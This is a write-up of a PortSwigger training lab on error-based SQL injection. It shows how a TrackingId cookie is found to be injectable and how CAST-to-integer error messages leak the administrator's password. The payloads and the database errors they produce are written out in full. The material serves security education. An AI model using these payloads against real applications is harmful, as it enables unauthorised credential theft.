---
title: Visible error-based SQL injection
description: A writeup of PortSwigger's SQL injection lab for blind sqli based on visible sql errors.
author: Koussay Dhifi
categories: [Writeups, WebExploitation]
tags: [WebExploitation, SQLInjection, PortSwigger, Labs, UNION]
mermaid: true
---

## Introduction

This is another SQLi lab titled [Visible error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based). This time, SQL errors are visible and returned as they are, unlike in the previous lab.

## Recon

We are presented with the same e-commerce-like website provided by PortSwigger, shown in the following image.

![Lab Overview](../assets/sqli/lab13/image.png)

We have the usual categories. When we click on a specific category, we get redirected to the URL `/filter?category=<CategoryName>`, but when we try to inject some special characters there, like `'`, to trigger a SQL error, nothing is returned to us, as shown in the following image.

![Result](../assets/sqli/lab13/image%20copy.png)

No other input fields exist on the website, so we are going to check fields within the headers, and we find the same TrackingId we found in the previous lab.

```sh
Cookie: TrackingId=HxhEcg8RshtDLyCE; session=F7EfXDo1SNx4uTadbealK1Qnb7Gabco1
```

**TrackingID is a mechanism used by developers or software engineers to identify browsers without using an authentication wall like logging in or registering, and usually a TrackingID is stored within the database, so there are SQL queries that include this variable within the headers.**

## Vuln Detection and Analysis

So, if we add a special character like `'`, we get the following error.

```html
    <h4>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'HxhEcg8RshtDLyCE''. Expected  char</h4>
    <p class=is-warning>Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'HxhEcg8RshtDLyCE''. Expected  char</p>
```

We get a SQL error, which means that the cookie field TrackingId is vulnerable to SQLi.

## Exploit and Payload

When we try to exploit conditions, as we always do in SQL injection, we realize a weird behavior: our input gets trimmed by a specific number of characters, so there is a limited number of characters allowed for us.

For example, when we inject `' AND (SELECT LENGTH(password) FROM users where username='administrator')=5 -- `, we get the following error.

```sql
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'HxhEcg8RshtDLyCE' AND (SELECT LENGTH(password) FROM username'. Expected  char
```

That means the maximum number of characters we are allowed to inject is 44 - 45 if we count the `'` at the end of the query. But if we remove the characters of the TrackingId, we get to insert 60 characters. 60 characters is what we are allowed to inject into the TrackingId, so we need to craft a sophisticated payload for this.

Since we are getting SQL error messages, we can try to exploit this. Basically, the database engine generating the error is always trying to be "smart" and offer a better experience to developers and engineers by writing more detailed errors.

For example, it can sometimes show elements from the database in error messages. For example, if we do:

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int) --
```

What we did was basically try to convert the first username into an integer.

We get the error:

```sql
ERROR: invalid input syntax for type integer: "administrator"
```

So we get to know that the first user is the administrator, and thus we can extract the password by just replacing the username with the password.

If we inject:

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int) --
```

It respects the 60-char constraint, and the error message will eventually show us the password.

```sql
ERROR: invalid input syntax for type integer: "25po27l2ic00y7oqygxv"
```

And thus we got the credentials `administrator:25po27l2ic00y7oqygxv`, and we can log in, and thus the lab is solved, ALHAMDULLAH.

## Conclusion

A new tip we learned from this lab is that error messages can leak sensitive data, no matter where they come from — whether DBMS, compilers, or interpreters — and as pentesters, we need to keep that in mind.